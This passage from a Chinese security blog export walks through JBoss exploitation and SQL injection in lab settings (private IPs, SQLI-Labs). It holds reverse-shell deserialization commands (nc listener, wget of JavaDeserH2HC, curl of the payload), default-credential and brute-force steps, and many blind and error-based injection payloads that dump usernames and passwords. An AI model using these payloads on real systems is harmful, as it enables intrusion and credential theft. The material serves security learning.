class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 6666(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:6666\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702142036913.png\" alt=\"image-20200702142036913\"></p>\n<p><img src=\"/images/Jboss/image-20200702142043798.png\" alt=\"image-20200702142043798\"></p>\n<h5 id=\"漏洞修复-6\"><a href=\"#漏洞修复-6\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、版本升级</p>\n<h4 id=\"CVE-2017-12149\"><a href=\"#CVE-2017-12149\" class=\"headerlink\" title=\"CVE-2017-12149\"></a>CVE-2017-12149</h4><h5 id=\"漏洞描述-7\"><a href=\"#漏洞描述-7\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>此漏洞主要是由于<code>jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet</code>目录下的<code>ReadOnlyAccessFilter.class</code>文件中的<code>doFilter</code>方法，再将序列化传入<code>ois</code>中，并没有进行过滤便调用了<code>readObject()</code>进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。</p>\n<h5 id=\"影响范围-7\"><a href=\"#影响范围-7\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBossAS 5.x</p>\n<p>JBossAS 6.x</p>\n<h5 id=\"漏洞原理-7\"><a href=\"#漏洞原理-7\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>该漏洞存在于JBoss AS的HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>\n<h5 id=\"漏洞检测-6\"><a href=\"#漏洞检测-6\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、版本确定</p>\n<p><img src=\"/images/Jboss/image-20200630152601209.png\" alt=\"image-20200630152601209\"></p>\n<p>2、PoC访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/invoker/readonly</span><br><span class=\"line\">//如出现500可确定目标主机存在漏洞</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630152657545.png\" alt=\"image-20200630152657545\"></p>\n<p>3、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 8888(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.135:8888\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.135:8080/invoker/<span class=\"built_in\">readonly</span> --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630221608353.png\" alt=\"image-20200630221608353\"></p>\n<p><img src=\"/images/Jboss/image-20200630221503084.png\" alt=\"image-20200630221503084\"></p>\n<h5 id=\"漏洞修复-7\"><a href=\"#漏洞修复-7\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、删除http-invoker.sar组件</p>\n<p>2、版本升级(此漏洞只存在AS5、AS6)</p>\n<h4 id=\"Administration-Console-弱口令\"><a href=\"#Administration-Console-弱口令\" class=\"headerlink\" title=\"Administration Console 弱口令\"></a>Administration Console 弱口令</h4><h5 id=\"漏洞描述-8\"><a href=\"#漏洞描述-8\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>Administration Console</code>存在默认密码<code>admin admin</code>,我们可以登录到后台部署war包<code>getshell</code></p>\n<h5 id=\"影响范围-8\"><a href=\"#影响范围-8\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>全版本</p>\n<h5 id=\"漏洞原理-8\"><a href=\"#漏洞原理-8\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss默认Console是admin/admin.</p>\n<h5 id=\"漏洞检测-7\"><a href=\"#漏洞检测-7\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、访问以下URL</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.157:8080/jmx-console/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702151249993.png\" alt=\"image-20200702151249993\"></p>\n<p>2、远程部署war</p>\n<p>这部分直接参考<code>CVE-2007-1036</code>操作基本一致</p>\n<h5 id=\"漏洞修复-8\"><a href=\"#漏洞修复-8\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、修改默认账户及密码（足够强壮）</p>\n<h4 id=\"JBoss-gt-7-x弱口令及爆破\"><a href=\"#JBoss-gt-7-x弱口令及爆破\" class=\"headerlink\" title=\"JBoss &gt;7.x弱口令及爆破\"></a>JBoss &gt;7.x弱口令及爆破</h4><h5 id=\"漏洞描述-9\"><a href=\"#漏洞描述-9\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>jboss</code>从8开始正式更名为<code>WildFly</code> ,在<code>WildFly8</code>之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的<code>jboss</code>,针对<code>WildFly</code>之后版本的弱口令推荐<code>wildPwn</code>自动化爆破工具。</p>\n<h5 id=\"漏洞范围\"><a href=\"#漏洞范围\" class=\"headerlink\" title=\"漏洞范围\"></a>漏洞范围</h5><p>JBoss &gt;7.x（wildFly所需jdk版本为7及以上才行）</p>\n<h5 id=\"漏洞原理-9\"><a href=\"#漏洞原理-9\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss 8之后开始更名为<code>WildFly</code>其默认采用强密码策略，但也会存在可爆破风险。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//部署指定目录</span><br><span class=\"line\">/usr/local/wildfly-8.0.0.Final</span><br><span class=\"line\">//修改环境路径</span><br><span class=\"line\">export JBOSS_HOME=/usr/local/wildfly-8.0.0.Final/</span><br><span class=\"line\">export PATH=$PATH:$JBOSS_HOME/bin</span><br><span class=\"line\">//添加新账户</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./add-user.sh</span></span><br><span class=\"line\">What type of user do you wish to add?</span><br><span class=\"line\"> a) Management User (mgmt-users.properties)</span><br><span class=\"line\"> b) Application User (application-users.properties)</span><br><span class=\"line\">(a): a</span><br><span class=\"line\"></span><br><span class=\"line\">Enter the details of the new user to add.</span><br><span class=\"line\">Using realm &#x27;ManagementRealm&#x27; as discovered from the existing property files.</span><br><span class=\"line\">Username : admin</span><br><span class=\"line\">The username &#x27;admin&#x27; is easy to guess</span><br><span class=\"line\">Are you sure you want to add user &#x27;admin&#x27; yes/no? yes</span><br><span class=\"line\">Password recommendations are listed below. To modify these restrictions edit the add-user.properties configuration file.</span><br><span class=\"line\"> - The password should not be one of the following restricted values &#123;root, admin, administrator&#125;</span><br><span class=\"line\"> - The password should contain at least 8 characters, 1 alphanumeric character(s), 1 digit(s), 1 non-alphanumeric symbol(s)</span><br><span class=\"line\"> - The password should be different from the username</span><br><span class=\"line\">Password :</span><br><span class=\"line\">JBAS015269: Password must have at least 8 characters!</span><br><span class=\"line\">Are you sure you want to use the password entered yes/no? yes</span><br><span class=\"line\">Re-enter Password :</span><br><span class=\"line\">What groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]:</span><br><span class=\"line\">About to add user &#x27;admin&#x27; for realm &#x27;ManagementRealm&#x27;</span><br><span class=\"line\">Is this correct yes/no? yes</span><br><span class=\"line\">Added user &#x27;admin&#x27; to file &#x27;/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-users.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; to file &#x27;/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-users.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; with groups  to file &#x27;/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-groups.properties&#x27;</span><br><span class=\"line\">Added user &#x27;admin&#x27; with groups  to file &#x27;/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-groups.properties&#x27;</span><br><span class=\"line\">Is this new user going to be used for one AS process to connect to another AS process?</span><br><span class=\"line\">e.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.</span><br><span class=\"line\">yes/no? yes</span><br><span class=\"line\">To represent the user add the following to the server-identities definition &lt;secret value=&quot;dG9vcg==&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//启动JBoss(静默启动，程序会在后台运行)</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./standalone.sh -Djboss.bind.address=0.0.0.0 -Djboss.bind.address.management=0.0.0.0&amp;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞检测-8\"><a href=\"#漏洞检测-8\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//默认监听端口在9990</span><br><span class=\"line\">http://172.16.144.158:9990/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702202856723.png\" alt=\"image-20200702202856723\"></p>\n<p>2、爆破</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> git <span class=\"built_in\">clone</span> https://github.com/hlldz/wildPwn.git</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> wildPwn</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> python wildPwn.py -m brute --target 172.16.144.183 --port 8080 -user userList.txt -pass passList.txt</span></span><br><span class=\"line\"></span><br><span class=\"line\">nmap ‐n -Pn ‐‐script=wildfly‐brute.nse ‐‐script‐args &quot;userdb=userList.txt,passdb=pass.txt,hostname=domain.com&quot; 172.16.144.183 -p9990</span><br></pre></td></tr></table></figure>\n\n<p>貌似这个工具并没法实现爆破。</p>\n<h5 id=\"漏洞修复-9\"><a href=\"#漏洞修复-9\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、配置强口令</p>\n<p>2、限制来源IP</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上CVE汇总根据网上各大佬汇总得到，其中部分CVE使用的<code>JavaDeserH2HC</code>工具已经在环境搭建部分贴出；还有很多其他工具请自行github或google了。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;240174.html</span><br><span class=\"line\">https:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;show_bug.cgi?id&#x3D;615956</span><br></pre></td></tr></table></figure>\n\n"},{"title":"SQL注入全解","date":"2019-03-05T21:03:38.000Z","_content":"Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,[SQLI-Labs](https://github.com/Audi-1/sqli-labs)相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.\n\n|一、布尔盲注   |二、报错注入   |三、时间盲注   |\n|---|---|---|\n|left()函数   |count()&floor(rand())&group by   |sleep()函数   |\n|ascii()和substr函数   |EXP()函数   |if(condition,true,false)\n   |\n|ord()函数&mid()函数   |bigint溢出   |   |\n|regexp正则   |xpath报错注入:extractvalue()、updataxml()\t   |   |\n\n# 一、布尔盲注\n\n## 1.1.left()\n\n```BASH\n格式:left(str,1)>5\n```\n解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.\n\n```BASH\n示例:\nDatabase()='security'实际值;\nLeft(database(),1)>'s' 没有爆错并测出第一个字符是's'\nLeft(database(),2)>'sh' 需要加第一个字符,否则会爆错的;注意啦啦啦;\n```\n### 1.1.1.爆库\n1.1.1.1.猜测第一个字符\n\n```BASH\nURL:猜测第一个字符是否大于'i'字符\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),1)>'i'--+\n```\n![bool1](/images/sqlall/bool1.jpg)\n```BASH\nURL:确定第一个字符是s\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),1)='s'--+\n```\n1.1.1.2.猜解第二个字符\n\n```BASH\nURL:必须添加第一个字符,以便进行猜解第二个字符;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),2)='se'--+\n```\n```BASH\nURL:没有第九个字符,会直接报错,如下面URL.\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),9)>'securitya'--+\n```\n### 1.1.2.爆库\n```BASH\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select schema_name from information_schema.schemata limit\n0,1),1)='i'--+\n```\n![bool2](/images/sqlall/bool2.jpg)\n```BASH\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select schema_name from information_schema.schemata limit\n0,1),12)='information_'--+\n```\n![bool3](/images/sqlall/bool3.jpg)\n\n1.1.2.1.第一张表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1)='e'--+\n```\n\n![bool4](/images/sqlall/bool4.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),3)=‘ema’--+\n```\n\n1.1.2.2.第二张表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 1,1),1)='r'--+\n```\n\n![bool5](/images/sqlall/bool5.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 1,1),2)='re'--+\n```\n\n其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;\n\n### 1.1.3.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1)='i'--+\n```\n\n![bool6](/images/sqlall/bool6.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),2)='id'--+\n```\n\n其他字段名:id、username、password\n\n### 1.1.4.爆数据\n\n```bash\nURL:注意:第一个username是D,大写字符,但是这里无法区分大小写;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select username from security.users limit 0,1),1)='d'--+\n```\n\n![bool7](/images/sqlall/bool7.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select username from security.users limit 0,1),2)='du'--+\n```\n\n建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.\n\n## 1.2.ascii()&substr()\n\n```bash\n格式:\nascii(string)>ascii码           ascii转换作用,并与外部进行比较;\nsubstr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;\n```\n\n下面就利用此paylaod进行获取库中表名:\n\n```bash\nascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101\n//注意：database()已经通过以上方式可以获得;\n```\n\nASCII码对照表:http://ascii.911cha.com/\n\n### 1.2.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),1,1))=115 --+\n```\n\n![bool8](/images/sqlall/bool8.jpg)\n\n```bash\n其他URL:101—>'e'\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),2,1))=101 --+\n```\n\n注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),9,1))>65 --+\n```\n\n### 1.2.2.爆表\n\n```bash\nURL:101—>'e'\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1,1))=101 --+\n```\n\n![bool9](/images/sqlall/bool9.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),2,1))=109 --+\n```\n\n和上面一样修改部分数字即可;表名:users、emails等:\n\n### 1.2.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1,1))=105 --+\n```\n\n![bool10](/images/sqlall/bool10.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),2,1))=100 --+\n```\n\n其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;\n\n## 1.3.ord()&mid()\n\n通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.\n\n```bash\n格式:\nord(string)     对获取的字符进行ascii码转换;\nmid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;\nmid(column_name,start[,length])\n```\n\n### 1.3.1.爆库\n\n```bash\nURL:第一个字符的ASCII码\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ord(mid((select database()),1,1))=115--+\n```\n\n![bool12](/images/sqlall/bool12.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ord(mid((select database()),2,1))=101--+\n```\n\n后续的注入语句可以参考上面.\n\n## 1.4.regexp正则\n\n通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.\n\n```bash\n格式:regexp '^…'\nregexp ‘^…'  and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)\n--+\n```\n\n### 1.4.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 and database() regexp '^[a-z]' limit 0,1) --+\n```\n\n![bool13](/images/sqlall/bool13.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 and database() regexp '^[s-s]' limit 0,1) --+\n```\n\n### 1.4.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.tables where table_schema='security' and\ntable_name regexp '^[a-s]' limit 0,1) --+\n```\n\n![bool14](/images/sqlall/bool14.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.tables where table_schema='security' and\ntable_name regexp '^[e-e]' limit 0,1) --+\n```\n\n### 1.4.3.爆字段\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.columns where table_name='users' and\ncolumn_name regexp '^[a-z]' limit 0,1) --+\n````\n\n其他部分请自行继续.\n\n# 二、报错注入\n\n## 2.1.count&floor&group by\n\ncount(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析->floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.\n\n### 2.1.0.数据库\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n````\n\n![bool15](/images/sqlall/bool15.jpg)\n\n### 2.1.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select schema_name from \ninformation_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n![bool16](/images/sqlall/bool16.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select schema_name from\ninformation_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n### 2.1.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select table_name from\ninformation_schema.tables where table_schema='security' limit 0,1),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n```\n\n![bool17](/images/sqlall/bool17.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select table_name from\ninformation_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n```\n\n### 2.1.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select column_name from\ninformation_schema.columns where table_name='users' limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns\ngroup by a --+\n```\n\n![bool18](/images/sqlall/bool18.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select column_name from\ninformation_schema.columns where table_name='users' limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns\ngroup by a --+\n```\n\n### 2.1.4.爆数据\n\n```bash\nURL:这里payload只能爆出一列字段信息\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,scount(*),concat(0x3a,(select username from security.users limit\n0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n![bool19](/images/sqlall/bool19.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select password from security.users limit\n0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n## 2.2.EXP()报错\n\nEXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》\n\nURL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列\n\n```bash\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+\t\n```\n\n![bool21](/images/sqlall/bool21.jpg)\n\n如果列数量不对时会报错;\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),3--+\n```\n\n### 2.2.1.爆库\n\n```bash\n第一个数据库:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from\ninformation_schema.schemata limit 0,1)a))),2,3--+\n```\n\n![bool23](/images/sqlall/bool23.jpg)\n\n```bash\n第二个数据库:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from\ninformation_schema.schemata limit 1,1)a))),2,3--+\n```\n\n### 2.2.2.爆表\n\n```bash\n第一张表:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from\ninformation_schema.tables where table_schema='security' limit 0,1)a))),2,3--+\n```\n\n![bool24](/images/sqlall/bool24.jpg)\n\n```bash\n第三张表:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from\ninformation_schema.tables where table_schema='security' limit 2,1)a))),2,3--+\n```\n\n### 2.2.3.爆字段\n\n```bash\n第一个字段名:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from\ninformation_schema.columns where table_name='users' limit 0,1)a))),2,3--+\n```\n\n### 2.2.4.爆数据\n\n```bash\n第一列数据:注意：这里只是爆出username列;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT username from security.users limit\n0,1)a))),2,3 --+\n```\n\n![bool26](/images/sqlall/bool26.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT username from security.users limit\n1,1)a))),2,3 --+\n```\n\n### 2.2.5.爆两列数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT distinct\nconcat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+\n```\n\n![bool27](/images/sqlall/bool27.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT distinct\nconcat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+\n```\n\n## 2.3.bigint溢出\n\n具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;\n\n### 2.3.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select schema_name from\ninformation_schema.schemata limit 0,1)x) - ~0),2,3--+\n```\n\n![bool29](/images/sqlall/bool29.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select schema_name from\ninformation_schema.schemata limit 6,1)x) - ~0),2,3--+\n```\n\n### 2.3.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select table_name from information_schema.tables\nwhere table_schema='security' 